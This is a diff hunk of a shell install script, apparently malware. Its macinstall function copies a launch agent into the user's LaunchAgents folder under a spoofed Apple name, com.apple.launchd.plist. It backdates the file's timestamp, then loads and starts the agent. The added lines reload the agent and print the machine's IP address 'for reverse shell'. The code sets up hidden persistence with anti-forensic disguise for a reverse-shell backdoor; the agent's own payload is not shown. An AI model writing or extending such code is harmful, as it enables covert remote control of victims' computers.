@@ -25,10 +25,13 @@ macinstall() {
 	else
 		cp launchagent.xml ~/Library/LaunchAgents/com.apple.launchd.plist
 		touch -t 202405131058 ~/Library/LaunchAgents/com.apple.launchd.plist
+		launchctl unload ~/Library/LaunchAgents/com.apple.launchd.plist 2>/dev/null
 		launchctl load ~/Library/LaunchAgents/com.apple.launchd.plist
 		launchctl start com.apple.launchd
 		echo "Installed la."
 	fi
+	echo "ip for reverse shell:"
+	ipconfig getifaddr en0
 }
 
 linuxinstall() {
